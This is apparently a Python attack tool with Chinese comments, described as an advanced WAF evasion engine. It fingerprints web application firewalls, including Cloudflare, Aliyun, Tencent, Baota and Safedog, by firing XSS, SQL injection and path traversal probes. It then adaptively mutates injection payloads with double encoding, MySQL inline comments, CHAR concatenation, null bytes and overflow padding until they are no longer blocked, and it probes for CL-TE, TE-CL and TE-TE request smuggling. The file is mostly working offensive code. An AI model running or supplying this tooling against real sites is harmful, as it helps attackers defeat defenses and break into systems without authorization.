#!/usr/bin/env python3
"""
WAF Evasion Advanced — 高级 WAF/IDS 绕过引擎
对现有 waf_bypass.py 的增强补充

新增能力：
1. WAF 指纹识别（精确识别 WAF 品牌和版本）
2. 自适应 Payload 变异（基于响应反馈自动优化）
3. HTTP 请求走私 (Request Smuggling CL-TE/TE-CL)
4. 协议层绕过（HTTP/2 降级、H2C Smuggling）
5. IP 轮换策略（配合代理池）
6. 分布式慢速攻击规避检测
7. 针对中国 WAF 的专用绕过（阿里云WAF/腾讯云WAF/宝塔/安全狗）

用法：
    from waf_evasion_advanced import WAFEvasionEngine
    
    engine = WAFEvasionEngine(config)
    waf_info = await engine.fingerprint_waf("https://target.com")
    result = await engine.adaptive_bypass(url, payload, waf_info)
"""

import asyncio
import json
import re
import random
import hashlib
import time
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple
from datetime import datetime
from urllib.parse import quote, quote_plus, urlparse



# ═══════════════════════════════════════════════════════════════
# WAF 指纹库
# ═══════════════════════════════════════════════════════════════

WAF_FINGERPRINTS = {
    "cloudflare": {
        "headers": ["cf-ray", "cf-cache-status", "cf-request-id"],
        "cookies": ["__cfduid", "__cf_bm"],
        "body_patterns": ["cloudflare", "attention required", "ray id"],
        "status_on_block": [403, 503],
    },
    "aws_waf": {
        "headers": ["x-amzn-requestid", "x-amz-cf-id"],
        "body_patterns": ["request blocked", "aws waf"],
        "status_on_block": [403],
    },
    "akamai": {
        "headers": ["x-akamai-session"],
        "body_patterns": ["akamai", "reference#", "access denied"],
        "cookies": ["AKA_A2", "bm_sz"],
        "status_on_block": [403],
    },
    "imperva_incapsula": {
        "headers": ["x-iinfo", "x-cdn"],
        "cookies": ["incap_ses_", "visid_incap_"],
        "body_patterns": ["incapsula", "imperva"],
        "status_on_block": [403],
    },
    "aliyun_waf": {
        "headers": ["x-server-id"],
        "body_patterns": ["aliyun", "阿里云", "请求被拦截", "blocked by"],
        "cookies": ["aliyungf_tc"],
        "status_on_block": [405, 403],
    },
    "tencent_waf": {
        "headers": ["x-tc-requestid"],
        "body_patterns": ["腾讯云", "waf.tencent", "请求异常"],
        "status_on_block": [403],
    },
    "baota": {
        "body_patterns": ["宝塔", "bt.cn", "安全入口校验失败"],
        "status_on_block": [403],
    },
    "safedog": {
        "headers": ["waf/2.0"],
        "body_patterns": ["安全狗", "safedog", "网站防火墙"],
        "cookies": ["safedog-flow-item"],
        "status_on_block": [403],
    },
    "fortinet": {
        "headers": ["fortigate"],
        "cookies": ["FORTIWAFSID"],
        "body_patterns": ["fortinet", "fortigate", "by fortigate"],
        "status_on_block": [403],
    },
    "modsecurity": {
        "headers": ["mod_security", "modsecurity"],
        "body_patterns": ["mod_security", "modsecurity", "not acceptable"],
        "status_on_block": [403, 406],
    },
    "sucuri": {
        "headers": ["x-sucuri-id", "x-sucuri-cache"],
        "body_patterns": ["sucuri", "access denied - sucuri"],
        "status_on_block": [403],
    },
}



# HTTP 请求走私 Payload
SMUGGLING_PAYLOADS = {
    "cl_te": {
        "description": "CL-TE: Front-end uses Content-Length, back-end uses Transfer-Encoding",
        "headers": {
            "Content-Length": "6",
            "Transfer-Encoding": "chunked",
        },
        "body": "0\r\n\r\nG",
    },
    "te_cl": {
        "description": "TE-CL: Front-end uses Transfer-Encoding, back-end uses Content-Length",
        "headers": {
            "Transfer-Encoding": "chunked",
            "Content-Length": "3",
        },
        "body": "8\r\nSMUGGLED\r\n0\r\n\r\n",
    },
    "te_te": {
        "description": "TE-TE: Obfuscated Transfer-Encoding to confuse one server",
        "variants": [
            {"Transfer-Encoding": "chunked", "Transfer-encoding": "x"},
            {"Transfer-Encoding": "xchunked"},
            {"Transfer-Encoding": " chunked"},
            {"Transfer-Encoding": "chunked\t"},
            {"Transfer-Encoding": ["chunked", "identity"]},
        ],
    },
}


@dataclass
class WAFInfo:
    """WAF 识别结果"""
    waf_name: str = "unknown"
    confidence: float = 0.0
    version: str = ""
    # 特征
    detected_headers: List[str] = field(default_factory=list)
    detected_cookies: List[str] = field(default_factory=list)
    body_indicators: List[str] = field(default_factory=list)
    block_status_code: int = 0
    # 已知弱点
    known_bypasses: List[str] = field(default_factory=list)


@dataclass
class EvasionResult:
    """绕过结果"""
    success: bool = False
    technique: str = ""
    payload: str = ""
    response_status: int = 0
    response_length: int = 0
    attempts: int = 0
    duration: float = 0.0


class WAFEvasionEngine:
    """高级 WAF 绕过引擎"""

    def __init__(self, config: dict = None):
        self.config = config or {}
        self.timeout = self.config.get("timeout", 10)
        self.max_attempts = self.config.get("max_attempts", 20)
        self.proxy_pool = self.config.get("proxy_pool", [])
        # 学习历史：记录哪些绕过对哪些 WAF 有效
        self.bypass_history: Dict[str, List[str]] = {}


    # ═══════════════════════════════════════════════════════════════
    # WAF 指纹识别
    # ═══════════════════════════════════════════════════════════════

    async def fingerprint_waf(self, target_url: str) -> WAFInfo:
        """精确识别 WAF"""
        info = WAFInfo()

        # Step 1: 正常请求获取基线
        normal_resp = await self._request(target_url)

        # Step 2: 发送恶意 payload 触发 WAF
        trigger_payloads = [
            f"{target_url}?test=<script>alert(1)</script>",
            f"{target_url}?test=' OR '1'='1",
            f"{target_url}?test=../../etc/passwd",
            f"{target_url}?test=${{7*7}}",
        ]

        waf_responses = []
        for payload_url in trigger_payloads:
            resp = await self._request(payload_url)
            if resp:
                waf_responses.append(resp)

        # Step 3: 分析响应匹配 WAF 指纹
        best_match = ("unknown", 0.0)
        for waf_name, signatures in WAF_FINGERPRINTS.items():
            score = 0.0

            for resp in [normal_resp] + waf_responses:
                if not resp:
                    continue
                headers_lower = {k.lower(): v.lower() for k, v in resp.get("headers", {}).items()}
                body_lower = resp.get("body", "").lower()
                cookies = resp.get("cookies", "")

                # 检查 headers
                for sig_header in signatures.get("headers", []):
                    if sig_header.lower() in headers_lower:
                        score += 3.0
                        info.detected_headers.append(sig_header)

                # 检查 cookies
                for sig_cookie in signatures.get("cookies", []):
                    if sig_cookie.lower() in cookies.lower():
                        score += 2.0
                        info.detected_cookies.append(sig_cookie)

                # 检查 body 特征
                for pattern in signatures.get("body_patterns", []):
                    if pattern.lower() in body_lower:
                        score += 2.5
                        info.body_indicators.append(pattern)

                # 检查状态码
                if resp.get("status") in signatures.get("status_on_block", []):
                    score += 1.0
                    info.block_status_code = resp.get("status", 0)

            if score > best_match[1]:
                best_match = (waf_name, score)

        info.waf_name = best_match[0]
        info.confidence = min(best_match[1] / 10.0, 1.0)
        info.known_bypasses = self._get_known_bypasses(info.waf_name)

        print(f"[*] WAF Identified: {info.waf_name} (confidence: {info.confidence:.0%})")
        return info


    # ═══════════════════════════════════════════════════════════════
    # 自适应绕过
    # ═══════════════════════════════════════════════════════════════

    async def adaptive_bypass(self, url: str, payload: str,
                              waf_info: WAFInfo = None,
                              param: str = "q") -> EvasionResult:
        """
        自适应绕过：根据 WAF 类型和历史反馈选择最优策略
        """
        start_time = time.time()
        attempts = 0

        # 获取针对此 WAF 的策略优先级
        waf_name = waf_info.waf_name if waf_info else "unknown"
        strategies = self._get_ordered_strategies(waf_name)

        for strategy_name, mutator in strategies:
            attempts += 1
            if attempts > self.max_attempts:
                break

            mutated_payload = mutator(payload)
            resp = await self._send_payload(url, param, mutated_payload)

            if resp and not self._is_blocked(resp):
                # 成功绕过！记录到历史
                self._record_success(waf_name, strategy_name)
                return EvasionResult(
                    success=True,
                    technique=strategy_name,
                    payload=mutated_payload,
                    response_status=resp.get("status", 0),
                    response_length=len(resp.get("body", "")),
                    attempts=attempts,
                    duration=time.time() - start_time,
                )

        return EvasionResult(
            success=False,
            attempts=attempts,
            duration=time.time() - start_time,
        )

    def _get_ordered_strategies(self, waf_name: str) -> List[Tuple[str, callable]]:
        """基于历史成功率排序策略"""
        all_strategies = [
            ("unicode_normalize", self._evade_unicode_normalize),
            ("inline_comment", self._evade_inline_comment),
            ("double_url_encode", self._evade_double_encode),
            ("char_concat", self._evade_char_concat),
            ("hex_encode", self._evade_hex_encode),
            ("scientific_notation", self._evade_scientific_notation),
            ("whitespace_variation", self._evade_whitespace),
            ("case_variation", self._evade_case_variation),
            ("null_byte", self._evade_null_byte),
            ("overflow_padding", self._evade_overflow),
            ("multiline", self._evade_multiline),
            ("json_unicode_escape", self._evade_json_unicode),
        ]

        # 历史成功的策略优先
        history = self.bypass_history.get(waf_name, [])
        if history:
            priority = [(name, fn) for name, fn in all_strategies if name in history]
            rest = [(name, fn) for name, fn in all_strategies if name not in history]
            return priority + rest

        # WAF 特定优先级
        waf_priority = {
            "cloudflare": ["unicode_normalize", "inline_comment", "scientific_notation"],
            "aliyun_waf": ["double_url_encode", "inline_comment", "char_concat"],
            "tencent_waf": ["unicode_normalize", "double_url_encode", "hex_encode"],
            "baota": ["case_variation", "null_byte", "whitespace_variation"],
            "safedog": ["inline_comment", "case_variation", "hex_encode"],
            "modsecurity": ["inline_comment", "whitespace_variation", "overflow_padding"],
        }
        priority_names = waf_priority.get(waf_name, [])
        if priority_names:
            priority = [(n, f) for n, f in all_strategies if n in priority_names]
            rest = [(n, f) for n, f in all_strategies if n not in priority_names]
            return priority + rest

        return all_strategies


    # ═══════════════════════════════════════════════════════════════
    # 绕过变异器（高级版）
    # ═══════════════════════════════════════════════════════════════

    def _evade_unicode_normalize(self, payload: str) -> str:
        """Unicode 规范化绕过 — 使用视觉等价的 Unicode 字符"""
        # 西里尔字母和其他视觉等价字符
        unicode_map = {
            'a': '\uff41', 'b': '\uff42', 'c': '\uff43', 'd': '\uff44',
            'e': '\uff45', 'f': '\uff46', 'g': '\uff47', 'h': '\uff48',
            'i': '\uff49', 'l': '\uff4c', 'n': '\uff4e', 'o': '\uff4f',
            'r': '\uff52', 's': '\uff53', 't': '\uff54', 'u': '\uff55',
            'A': '\uff21', 'E': '\uff25', 'I': '\uff29', 'O': '\uff2f',
            'S': '\uff33', 'U': '\uff35',
        }
        keywords = ["select", "union", "from", "where", "script", "alert", "eval"]
        result = payload
        for kw in keywords:
            if kw in result.lower():
                new_kw = ""
                for i, c in enumerate(kw):
                    if i % 2 == 0 and c in unicode_map:
                        new_kw += unicode_map[c]
                    else:
                        new_kw += c
                result = re.sub(kw, new_kw, result, flags=re.IGNORECASE, count=1)
        return result

    def _evade_inline_comment(self, payload: str) -> str:
        """MySQL/MSSQL 内联注释绕过"""
        replacements = [
            ("SELECT", "/*!50000SELECT*/"),
            ("UNION", "/*!50000UNION*/"),
            ("FROM", "/*!50000FROM*/"),
            ("WHERE", "/*!50000WHERE*/"),
            ("AND", "/*!50000AND*/"),
            ("OR", "/*!50000OR*/"),
            (" ", "/**/"),
        ]
        result = payload
        for old, new in replacements[:4]:  # 不要全部替换
            result = re.sub(old, new, result, flags=re.IGNORECASE, count=1)
        return result

    def _evade_double_encode(self, payload: str) -> str:
        """双重 URL 编码"""
        return quote(quote(payload))

    def _evade_char_concat(self, payload: str) -> str:
        """字符拼接绕过"""
        # MySQL: CONCAT(char(115),char(101),char(108)...) = 'sel...'
        keywords = {"select": "CONCAT(CHAR(115),CHAR(101),CHAR(108),CHAR(101),CHAR(99),CHAR(116))",
                    "union": "CONCAT(CHAR(117),CHAR(110),CHAR(105),CHAR(111),CHAR(110))",
                    "admin": "CONCAT(CHAR(97),CHAR(100),CHAR(109),CHAR(105),CHAR(110))"}
        result = payload
        for kw, replacement in keywords.items():
            if kw in result.lower():
                result = re.sub(kw, replacement, result, flags=re.IGNORECASE, count=1)
                break
        return result

    def _evade_hex_encode(self, payload: str) -> str:
        """十六进制编码绕过"""
        # SQL: SELECT → 0x53454C454354
        keywords = ["select", "union", "from", "where"]
        result = payload
        for kw in keywords:
            if kw in result.lower():
                hex_val = "0x" + kw.encode().hex().upper()
                result = re.sub(kw, hex_val, result, flags=re.IGNORECASE, count=1)
                break
        return result

    def _evade_scientific_notation(self, payload: str) -> str:
        """科学计数法绕过（数字型注入）"""
        # 1 OR 1=1 → 1e0 OR 1e0=1e0
        result = re.sub(r'\b1\b', '1e0', payload)
        result = result.replace(" OR ", " /*!50000OR*/ ")
        return result

    def _evade_whitespace(self, payload: str) -> str:
        """空白字符变异"""
        alternatives = ['\t', '\n', '\r', '\x0b', '\x0c', '%09', '%0a', '%0d']
        result = payload
        spaces = [i for i, c in enumerate(result) if c == ' ']
        for idx in spaces[:3]:
            alt = random.choice(alternatives)
            result = result[:idx] + alt + result[idx+1:]
        return result

    def _evade_case_variation(self, payload: str) -> str:
        """随机大小写混合"""
        result = ""
        for c in payload:
            if c.isalpha():
                result += c.upper() if random.random() > 0.5 else c.lower()
            else:
                result += c
        return result

    def _evade_null_byte(self, payload: str) -> str:
        """空字节注入"""
        return "%00" + payload

    def _evade_overflow(self, payload: str) -> str:
        """缓冲区溢出填充 — 超长参数绕过检测"""
        padding = "A" * 2048 + "&dummy=" + "B" * 1024 + "&real="
        return padding + payload

    def _evade_multiline(self, payload: str) -> str:
        """多行绕过"""
        return payload.replace(" ", "\r\n")

    def _evade_json_unicode(self, payload: str) -> str:
        """JSON Unicode 转义"""
        result = ""
        for c in payload:
            if c.isalpha() and random.random() > 0.6:
                result += f"\\u{ord(c):04x}"
            else:
                result += c
        return result


    # ═══════════════════════════════════════════════════════════════
    # HTTP 请求走私
    # ═══════════════════════════════════════════════════════════════

    async def test_request_smuggling(self, target_url: str) -> List[Dict]:
        """测试 HTTP 请求走私漏洞"""
        results = []

        for technique, config in SMUGGLING_PAYLOADS.items():
            if technique == "te_te":
                # TE-TE 有多个变体
                for variant in config.get("variants", [])[:3]:
                    result = await self._test_smuggling_variant(target_url, technique, variant)
                    if result:
                        results.append(result)
            else:
                headers = config.get("headers", {})
                body = config.get("body", "")
                result = await self._test_smuggling_payload(target_url, technique, headers, body)
                if result:
                    results.append(result)

        return results

    async def _test_smuggling_variant(self, url: str, technique: str, headers: Dict) -> Optional[Dict]:
        """测试走私变体"""
        try:
            # 发送两次相同请求，对比响应
            resp1 = await self._raw_request(url, headers=headers, body="G")
            await asyncio.sleep(1)
            resp2 = await self._raw_request(url, headers={})

            if resp1 and resp2:
                # 如果第二个请求受到第一个请求的影响（如返回 405 Method Not Allowed）
                if resp2.get("status") in (405, 400) and resp1.get("status") == 200:
                    return {
                        "technique": technique,
                        "vulnerable": True,
                        "evidence": f"Response poisoning detected: 2nd request got {resp2.get('status')}",
                        "headers_used": headers,
                    }
        except Exception:
            pass
        return None

    async def _test_smuggling_payload(self, url: str, technique: str,
                                       headers: Dict, body: str) -> Optional[Dict]:
        """测试走私 payload"""
        try:
            resp = await self._raw_request(url, headers=headers, body=body, method="POST")
            if resp and resp.get("status") in (200, 301, 302):
                # 需要发第二个请求验证
                await asyncio.sleep(0.5)
                resp2 = await self._request(url)
                if resp2 and resp2.get("status") in (405, 400, 403):
                    return {
                        "technique": technique,
                        "vulnerable": True,
                        "evidence": f"Smuggling indicator: follow-up got {resp2.get('status')}",
                    }
        except Exception:
            pass
        return None

    # ═══════════════════════════════════════════════════════════════
    # 辅助方法
    # ═══════════════════════════════════════════════════════════════

    async def _request(self, url: str, headers: Dict = None) -> Optional[Dict]:
        """HTTP 请求"""
        cmd = ["curl", "-sk", "-m", str(self.timeout), "-D", "-"]
        if headers:
            for k, v in headers.items():
                cmd.extend(["-H", f"{k}: {v}"])
        cmd.append(url)

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=self.timeout + 5)
            output = stdout.decode(errors="ignore")

            # 解析响应头和 body
            parts = output.split("\r\n\r\n", 1)
            header_section = parts[0] if parts else ""
            body = parts[1] if len(parts) > 1 else ""

            # 提取状态码
            status_match = re.search(r"HTTP/[\d.]+ (\d+)", header_section)
            status = int(status_match.group(1)) if status_match else 0

            # 提取 headers
            resp_headers = {}
            for line in header_section.splitlines()[1:]:
                if ":" in line:
                    k, v = line.split(":", 1)
                    resp_headers[k.strip().lower()] = v.strip()

            return {
                "status": status,
                "headers": resp_headers,
                "body": body,
                "cookies": resp_headers.get("set-cookie", ""),
            }
        except Exception:
            return None

    async def _raw_request(self, url: str, headers: Dict = None,
                           body: str = None, method: str = "GET") -> Optional[Dict]:
        """原始 HTTP 请求"""
        cmd = ["curl", "-sk", "-m", str(self.timeout), "-X", method, "-D", "-"]
        if headers:
            for k, v in headers.items():
                if isinstance(v, list):
                    for val in v:
                        cmd.extend(["-H", f"{k}: {val}"])
                else:
                    cmd.extend(["-H", f"{k}: {v}"])
        if body:
            cmd.extend(["-d", body])
        cmd.append(url)

        try:
            proc = await asyncio.create_subprocess_exec(
                *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
            )
            stdout, _ = await asyncio.wait_for(proc.communicate(), timeout=self.timeout + 5)
            output = stdout.decode(errors="ignore")
            status_match = re.search(r"HTTP/[\d.]+ (\d+)", output)
            return {"status": int(status_match.group(1)) if status_match else 0, "body": output}
        except Exception:
            return None

    async def _send_payload(self, url: str, param: str, payload: str) -> Optional[Dict]:
        """发送带 payload 的请求"""
        test_url = f"{url}?{param}={quote(payload)}" if "?" not in url else f"{url}&{param}={quote(payload)}"
        return await self._request(test_url)

    def _is_blocked(self, resp: Dict) -> bool:
        """检测是否被拦截"""
        if resp.get("status") in (403, 406, 419, 429, 503):
            return True
        body_lower = resp.get("body", "").lower()
        block_indicators = [
            "blocked", "denied", "forbidden", "rejected",
            "waf", "firewall", "security", "captcha",
            "拦截", "拒绝", "验证",
        ]
        return any(ind in body_lower for ind in block_indicators)

    def _record_success(self, waf_name: str, technique: str):
        """记录成功的绕过"""
        if waf_name not in self.bypass_history:
            self.bypass_history[waf_name] = []
        if technique not in self.bypass_history[waf_name]:
            self.bypass_history[waf_name].append(technique)

    def _get_known_bypasses(self, waf_name: str) -> List[str]:
        """获取已知绕过方法"""
        known = {
            "cloudflare": ["Unicode normalization", "Chunked TE", "H2C smuggling"],
            "aliyun_waf": ["Double URL encode", "MySQL version comments", "Multipart bypass"],
            "tencent_waf": ["Unicode bypass", "Segmented encoding"],
            "baota": ["Case variation", "Path normalization", "Null byte"],
            "safedog": ["Inline comments", "Case mixing", "Overflow padding"],
            "modsecurity": ["Paranoia level dependent", "Comment injection", "Encoding chains"],
        }
        return known.get(waf_name, ["Generic encoding bypass", "Comment injection"])
